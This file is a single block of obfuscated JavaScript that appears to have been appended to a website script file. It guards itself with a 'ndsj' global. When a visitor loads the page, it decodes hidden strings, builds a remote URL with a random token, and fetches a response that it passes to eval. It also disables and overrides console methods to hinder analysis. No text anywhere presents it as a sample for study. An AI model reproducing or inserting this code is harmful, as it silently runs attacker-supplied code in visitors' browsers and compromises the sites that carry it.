};if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};